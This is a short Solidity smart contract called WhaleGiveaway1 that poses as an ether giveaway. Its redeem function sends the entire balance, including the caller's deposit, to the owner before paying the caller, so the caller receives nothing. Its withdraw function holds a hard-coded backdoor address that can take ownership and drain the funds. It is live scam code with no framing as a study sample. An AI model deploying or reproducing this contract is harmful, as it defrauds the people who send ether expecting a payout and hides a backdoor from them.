pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner;

    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway1() public {
        owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner || msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b);
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}